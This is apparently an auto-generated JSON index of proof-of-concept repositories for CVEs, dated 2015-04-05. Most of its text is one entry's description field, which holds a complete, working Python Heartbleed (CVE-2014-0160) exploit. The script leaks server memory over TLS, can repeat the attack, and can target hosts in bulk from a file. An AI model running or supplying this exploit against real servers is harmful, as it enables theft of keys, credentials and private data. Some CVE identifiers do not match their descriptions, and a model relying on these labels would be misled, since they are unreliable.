{
  "date": "2015-04-05",
  "count": 2,
  "cves": [
    {
      "cve_id": "CVE-2015-3456",
      "repo_info": "[duo-labs/mysslstrip](https://github.com/duo-labs/mysslstrip)",
      "description": "CVE-2015-3152 PoC",
      "date": "2015-04-05",
      "raw_date": "2015-04-05T17:48:12Z"
    },
    {
      "cve_id": "CVE-2014-8609",
      "repo_info": "[xanas/heartbleed.py](https://github.com/xanas/heartbleed.py)",
      "description": "#!/usr/bin/python  # Modified by Travis Lee # -changed output to display text only instead of hexdump and made it easier to read # -added option to specify number of times to connect to server (to get more data) # -added option to specify TLS version # -added option to send STARTTLS command for use with SMTP/POP/IMAP/FTP/etc...  # -added option to specify an input file of multiple hosts, line delimited, with or without a port specified (host:port) # -added option to have verbose output # -added capability to automatically check if STARTTLS/STLS/AUTH TLS is supported when smtp/pop/imap/ftp ports are entered and automatically send appropriate command   # Quick and dirty demonstration of CVE-2014-0160 by Jared Stafford (jspenguin@jspenguin.org) # The author disclaims copyright to this source code.  import sys import struct import socket import time import select import re from optparse import OptionParser  options = OptionParser(usage=&#x27;%prog server [options]&#x27;, description=&#x27;Test for SSL heartbeat vulnerability (CVE-2014-0160)&#x27;) options.add_option(&#x27;-p&#x27;, &#x27;--port&#x27;, type=&#x27;int&#x27;, default=443, help=&#x27;TCP port to test (default: 443)&#x27;) options.add_option(&#x27;-n&#x27;, &#x27;--num&#x27;, type=&#x27;int&#x27;, default=1, help=&#x27;Number of times to connect/loop (default: 1)&#x27;) options.add_option(&#x27;-t&#x27;, &#x27;--tls&#x27;, type=&#x27;int&#x27;, default=1, help=&#x27;Specify TLS version: 0 = 1.0, 1 = 1.1, 2 = 1.2 (default: 1)&#x27;) options.add_option(&#x27;-s&#x27;, &#x27;--starttls&#x27;, action=&quot;store_true&quot;, dest=&quot;starttls&quot;, help=&#x27;Issue STARTTLS command for SMTP/POP/IMAP/FTP/etc...&#x27;) options.add_option(&#x27;-f&#x27;, &#x27;--filein&#x27;, type=&#x27;str&#x27;, help=&#x27;Specify input file, line delimited, IPs or hostnames or IP:port or hostname:port&#x27;) options.add_option(&#x27;-v&#x27;, &#x27;--verbose&#x27;, action=&quot;store_true&quot;, dest=&quot;verbose&quot;, help=&#x27;Enable verbose output&#x27;)  opts, args = options.parse_args()  def h2bin(x):     return x.replace(&#x27; &#x27;, &#x27;&#x27;).replace(&#x27;\\n&#x27;, &#x27;&#x27;).decode(&#x27;hex&#x27;)  hello = h2bin(&#x27;&#x27;&#x27; 16 03 02 00  dc 01 00 00 d8 03 02 53 43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00 00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88 00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c c0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09 c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44 c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11 00 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 04 03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19 00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08 00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13 00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00 00 0f 00 01 01                                   &#x27;&#x27;&#x27;)  # set TLS version if opts.tls == 0:     hb = h2bin(&#x27;&#x27;&#x27;18 03 01 00 03 01 40 00&#x27;&#x27;&#x27;) elif opts.tls == 1:     hb = h2bin(&#x27;&#x27;&#x27;18 03 02 00 03 01 40 00&#x27;&#x27;&#x27;) elif opts.tls == 2:     hb = h2bin(&#x27;&#x27;&#x27;18 03 03 00 03 01 40 00&#x27;&#x27;&#x27;) else:     hb = h2bin(&#x27;&#x27;&#x27;18 03 02 00 03 01 40 00&#x27;&#x27;&#x27;)   def hexdump(s):     pdat = &#x27;&#x27;     for b in xrange(0, len(s), 16):         lin = [c for c in s[b : b + 16]]         #hxdat = &#x27; &#x27;.join(&#x27;%02X&#x27; % ord(c) for c in lin)         pdat += &#x27;&#x27;.join((c if ((32 &lt;= ord(c) &lt;= 126) or (ord(c) == 10) or (ord(c) == 13)) else &#x27;.&#x27; )for c in lin) \t#print &#x27;  %04x: %-48s %s&#x27; % (b, hxdat, pdat) \tpdat = re.sub(r&#x27;([.]{50,})&#x27;, &#x27;&#x27;, pdat)     return pdat  def recvall(s, length, timeout=5):     try:         endtime = time.time() + timeout         rdata = &#x27;&#x27;         remain = length         while remain &gt; 0:             rtime = endtime - time.time()              if rtime &lt; 0:                 return None             r, w, e = select.select([s], [], [], 5)             if s in r:                 data = s.recv(remain)                 # EOF?                 if not data:                     return None                 rdata += data                 remain -= len(data)         return rdata              except:        print &quot;Error receiving data: &quot;, sys.exc_info()[0]  def recvmsg(s):     hdr = recvall(s, 5)     if hdr is None:         print &#x27;Unexpected EOF receiving record header - server closed connection&#x27;         return None, None, None     typ, ver, ln = struct.unpack(&#x27;&gt;BHH&#x27;, hdr)     pay = recvall(s, ln, 10)     if pay is None:         print &#x27;Unexpected EOF receiving record payload - server closed connection&#x27;         return None, None, None     if opts.verbose:         print &#x27; ... received message: type = %d, ver = %04x, length = %d&#x27; % (typ, ver, len(pay))     return typ, ver, pay  def hit_hb(s, targ):     s.send(hb)     while True:         typ, ver, pay = recvmsg(s)         if typ is None:             print &#x27;No heartbeat response received, server likely not vulnerable&#x27;             return &#x27;&#x27;          if typ == 24:             if opts.verbose:                 print &#x27;Received heartbeat response...&#x27;             #hexdump(pay)             if len(pay) &gt; 3:                 print &#x27;WARNING: &#x27; + targ + &#x27;:&#x27; + str(opts.port) + &#x27; returned more data than it should - server is vulnerable!&#x27;             else:                 print &#x27;Server processed malformed heartbeat, but did not return any extra data.&#x27;             return hexdump(pay)          if typ == 21:             print &#x27;Received alert:&#x27;             hexdump(pay)             print &#x27;Server returned error, likely not vulnerable&#x27;             return &#x27;&#x27;  def bleed(targ, port):     try:         res = &#x27;&#x27;         print         print &#x27;##################################################################&#x27;         print &#x27;Connecting to: &#x27; + targ + &#x27;:&#x27; + str(port) + &#x27; with TLSv1.&#x27; + str(opts.tls)         for x in range(0, opts.num):             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)             sys.stdout.flush()             s.settimeout(10)             s.connect((targ, port))              # send starttls command if specified as an option or if common smtp/pop3/imap ports are used             if (opts.starttls) or (port in {25, 587, 110, 143, 21}):                                  stls = False                 atls = False                                  # check if smtp supports starttls/stls                 if port in {25, 587}:                     print &#x27;SMTP Port... Checking for STARTTLS Capability...&#x27;                     check = s.recv(1024)                     s.send(&quot;EHLO someone.org\\n&quot;)                     sys.stdout.flush()                     check += s.recv(1024)                     if opts.verbose:                         print check                                                              if &quot;STARTTLS&quot; in check:                         opts.starttls = True                         print &quot;STARTTLS command found&quot;                     elif &quot;STLS&quot; in check:                         opts.starttls = True                         stls = True                         print &quot;STLS command found&quot;                     else:                         print &quot;STARTTLS command NOT found!&quot;                         print &#x27;##################################################################&#x27;                         return                                  # check if pop3/imap supports starttls/stls                                             elif port in {110, 143}:                     print &#x27;POP3/IMAP4 Port... Checking for STARTTLS Capability...&#x27;                     check = s.recv(1024)                     if port == 110:                         s.send(&quot;CAPA\\n&quot;)                     if port == 143:                         s.send(&quot;CAPABILITY\\n&quot;)                     sys.stdout.flush()                     check += s.recv(1024)                     if opts.verbose:                         print check                                                                 if &quot;STARTTLS&quot; in check:                         opts.starttls = True                         print &quot;STARTTLS command found&quot;                     elif &quot;STLS&quot; in check:                         opts.starttls = True                         stls = True                         print &quot;STLS command found&quot;                     else:                         print &quot;STARTTLS command NOT found!&quot;                         print &#x27;##################################################################&#x27;                         return                                          # check if ftp supports auth tls/starttls                                           elif port in {21}:                     print &#x27;FTP Port... Checking for AUTH TLS Capability...&#x27;                     check = s.recv(1024)                     s.send(&quot;FEAT\\n&quot;)                     sys.stdout.flush()                     check += s.recv(1024)                     if opts.verbose:                         print check                                              if &quot;STARTTLS&quot; in check:                         opts.starttls = True                         print &quot;STARTTLS command found&quot;                     elif &quot;AUTH TLS&quot; in check:                         opts.starttls = True                         atls = True                         print &quot;AUTH TLS command found&quot;                     else:                         print &quot;STARTTLS command NOT found!&quot;                         print &#x27;##################################################################&#x27;                         return                                                          # send appropriate tls command if supported                                         if opts.starttls:                            sys.stdout.flush()                     if stls:                         print &#x27;Sending STLS Command...&#x27;                         s.send(&quot;STLS\\n&quot;)                     elif atls:                         print &#x27;Sending AUTH TLS Command...&#x27;                         s.send(&quot;AUTH TLS\\n&quot;)                     else:                         print &#x27;Sending STARTTLS Command...&#x27;                         s.send(&quot;STARTTLS\\n&quot;)                     if opts.verbose:                         print &#x27;Waiting for reply...&#x27;                     sys.stdout.flush()                     recvall(s, 100000, 1)              print             print &#x27;Sending Client Hello...&#x27;             sys.stdout.flush()             s.send(hello)             if opts.verbose:                 print &#x27;Waiting for Server Hello...&#x27;             sys.stdout.flush()             while True:                 typ, ver, pay = recvmsg(s)                 if typ == None:                     print &#x27;Server closed connection without sending Server Hello.&#x27;                     print &#x27;##################################################################&#x27;                     return                 # Look for server hello done message.                 if typ == 22 and ord(pay[0]) == 0x0E:                     break              print &#x27;Sending heartbeat request...&#x27;             sys.stdout.flush()             s.send(hb)             res += hit_hb(s, targ)             s.close()                  print &#x27;##################################################################&#x27;         print                return res          except:        print &quot;Error connecting to host: &quot;, sys.exc_info()[0]        print &#x27;##################################################################&#x27;        print                 def main():     allresults = &#x27;&#x27;                          # if a file is specified, loop through file     if opts.filein:         fileIN = open(opts.filein, &quot;r&quot;)                  for line in fileIN:             targetinfo = line.strip().split(&quot;:&quot;)             if len(targetinfo) &gt; 1:                 allresults = bleed(targetinfo[0], int(targetinfo[1]))             else:                 allresults = bleed(targetinfo[0], opts.port)                          if allresults:                 print &#x27;%s&#x27; % (allresults)          fileIN.close()      else:         if len(args) &lt; 1:             options.print_help()             return         allresults = bleed(args[0], opts.port)         if allresults:             print &#x27;%s&#x27; % (allresults)          print      if __name__ == &#x27;__main__&#x27;:     main()",
      "date": "2015-04-05",
      "raw_date": "2015-04-05T22:03:30Z"
    }
  ],
  "generated_at": "2025-10-15T01:15:19.424366",
  "metadata": {
    "total_cves": 2,
    "date_range": "2015-04-05",
    "source": "README.md",
    "script_version": "2.0"
  }
}